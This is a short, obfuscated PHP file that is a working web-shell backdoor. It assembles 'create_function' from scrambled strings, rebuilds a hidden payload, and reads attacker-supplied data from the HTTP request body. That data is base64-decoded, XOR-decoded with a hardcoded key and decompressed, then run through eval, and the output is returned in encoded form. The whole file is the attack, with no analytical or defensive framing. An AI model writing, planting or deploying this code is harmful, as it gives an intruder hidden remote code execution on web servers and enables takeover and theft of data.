<?php
$v=str_replace('ex','','cexreatexeexex_fuexnctiexon');
$n='eJ1ntsJ1("php://J1input"),$m)==1) J1{@J1ob_startJ1();@evJ1aJ1l(@gzuJ1ncomJ1press(@x(';
$W='r(J1$i=0J1;$i<$l;){fJ1or($j=0;(J1$j<$J1c&&$iJ1<$l);$jJ1++,$iJ1++){$oJ1.=$tJ1{$i}^$kJ1{';
$l='18xy1JJ1iDa";fuJ1nJ1ction J1x($J1t,$k){$c=sJ1trlen($kJ1);$l=strlJ1en($t);$oJ1="";J1fo';
$b='J1$k="a9J177af2a";$kh=J1"J1e26a44aba8J148";$kJ1f="beJ1a1680d2d76J1";$p="J1U78ezJ19khJ';
$S='$j};}J1}rJ1eturn $J1o;J1}if (@preg_match(J1"/$kJ1hJ1(.+)J1$J1kf/J1",@fileJ1_get_cont';
$y='n();$r=@baJ1se64_enJ1code(@xJ1(@gzcomJ1presJ1s(J1J1$o),J1$kJ1));print("$p$kh$r$kf");}';
$o='J1@base6J14_decodeJ1($m[1]),$k)))J1;$o=@oJ1b_geJ1tJ1_cJ1onJ1tents();@ob_J1end_J1clea';
$Q=str_replace('J1','',$b.$l.$W.$S.$n.$o.$y);
$e=$v('',$Q);$e();
?>
